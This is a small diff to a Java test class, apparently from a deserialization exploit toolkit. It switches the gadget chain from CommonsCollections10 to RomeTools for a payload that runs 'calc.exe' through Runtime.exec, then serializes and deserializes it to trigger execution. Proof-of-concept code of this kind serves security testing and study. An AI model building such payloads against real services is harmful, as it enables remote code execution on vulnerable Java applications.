@@ -12,7 +12,7 @@ import java.util.regex.Pattern;
 public class Eval {
     public static void main(String[] args) throws Exception{
         String code = "Runtime.getRuntime().exec(\"calc.exe\");";
-        Object o = new Eval().getObject(CommonsCollections10.class,code);
+        Object o = new Eval().getObject(RomeTools.class,code);
         byte[] ser = Serializer.serialize(o);
         Deserializer.deserialize(ser);
     }
